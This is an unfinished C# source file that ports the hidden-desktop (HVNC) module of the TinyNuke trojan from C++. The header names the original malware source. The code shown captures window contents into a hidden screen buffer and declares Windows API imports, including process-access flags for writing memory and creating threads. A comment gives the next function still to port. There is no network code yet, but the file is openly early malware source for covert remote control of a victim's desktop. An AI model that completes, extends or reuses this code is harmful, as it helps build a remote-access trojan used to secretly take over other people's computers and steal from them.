﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


/*
 * Title: HVNC for C#
 * Description: Re-creating the C++ version of Hidden VNC (remote desktop) in C#
 * Status: Work in progress
 * Source (C++): https://github.com/rossja/TinyNuke/blob/master/Bot/HiddenDesktop.cpp
 * 
 */

namespace ConsoleApp127
{
    public class HVNC
    {

        public bool PaintWindow(IntPtr hwnd, IntPtr hdc, IntPtr hdc_screen)
        {
            bool ret = false;
            RECT rect = new RECT();
            GetWindowRect(hwnd, ref rect);

            IntPtr hdc_window = CreateCompatibleDC(hdc);
            IntPtr hbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);

            SelectObject(hdc_window, hbitmap);
            if (PrintWindow(hwnd, hdc_window, 0))
            {
                BitBlt(hdc_screen,
                    rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, hdc_window, 0, 0, SRCCOPY);
                ret = true;
            }
            DeleteObject(hbitmap);
            DeleteDC(hdc_window);

            return ret;
        }

        static void EnumWindowsTopToDown(IntPtr hwnd, WNDENUMPROC proc, long param)
        {
            IntPtr currentWindow = GetTopWindow(hwnd);
            if (currentWindow == IntPtr.Zero)
                return;
            if ((currentWindow = GetWindow(hwnd, 1)) == IntPtr.Zero)
                return;
            while (proc(currentWindow, param) && (currentWindow = GetWindow(currentWindow, 3)) != IntPtr.Zero) ;
        }

        struct EnumHWndsPrintData
        {
            public IntPtr hdc;
            public IntPtr hdc_screen;
        }

        public bool EnumHwndsPrint(IntPtr hwnd, long param)
        {
            EnumHWndsPrintData data = (EnumHWndsPrintData)Marshal.PtrToStructure((IntPtr)param, typeof(EnumHWndsPrintData));
            if (!IsWindowVisible(hwnd))
                return true;

            PaintWindow(hwnd, data.hdc, data.hdc_screen);

            int style = (int)GetWindowLongA(hwnd, -20);
            SetWindowLongA(hwnd, -20, style | 0x02000000L);

         
            if (Environment.OSVersion.Version.Major < 6)
            {
                GCHandle handle = default(GCHandle);
                EnumWindowsTopToDown(hwnd, EnumHwndsPrint, StructToLong(data, out handle));
                if (handle != null)
                    handle.Free();
            }
            return true;

        }
        static long StructToLong<T>(T item, out GCHandle handle)
        {
            handle = GCHandle.Alloc(item, GCHandleType.Pinned);
            return handle.AddrOfPinnedObject().ToInt64();
        }

        /*
         * 
         * To be continued
         * Row: 86
         * Next method to make: static BOOL GetDeskPixels(int serverWidth, int serverHeight)
         */


        [DllImport("user32.dll")]
        private static extern long SetWindowLongA(IntPtr hwnd, int nIndex, long dwNewLong);

        [DllImport("user32.dll")]
        private static extern long GetWindowLongA(IntPtr hwnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hwnd);

        public delegate bool WNDENUMPROC(IntPtr hwnd, long lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindow(IntPtr hwnd, uint cmd);
        [DllImport("user32.dll")]
        private static extern IntPtr GetTopWindow(IntPtr hwnd);

        [DllImport("user32.dll")]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcblt, uint nflags);

        public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
          int nWidth, int nHeight, IntPtr hObjectSource,
          int nXSrc, int nYSrc, int dwRop);
        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
          int nHeight);
        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hDC);
        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);


        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(IntPtr process, ref bool result);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(ProcessAccessType dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr process);

        [Flags]
        public enum ProcessAccessType
        {
            PROCESS_TERMINATE = (0x0001),
            PROCESS_CREATE_THREAD = (0x0002),
            PROCESS_SET_SESSIONID = (0x0004),
            PROCESS_VM_OPERATION = (0x0008),
            PROCESS_VM_READ = (0x0010),
            PROCESS_VM_WRITE = (0x0020),
            PROCESS_DUP_HANDLE = (0x0040),
            PROCESS_CREATE_PROCESS = (0x0080),
            PROCESS_SET_QUOTA = (0x0100),
            PROCESS_SET_INFORMATION = (0x0200),
            PROCESS_QUERY_INFORMATION = (0x0400),
            PROCESS_QUERY_LIMITED_INFORMATION = (0x1000)
        }
    }
}
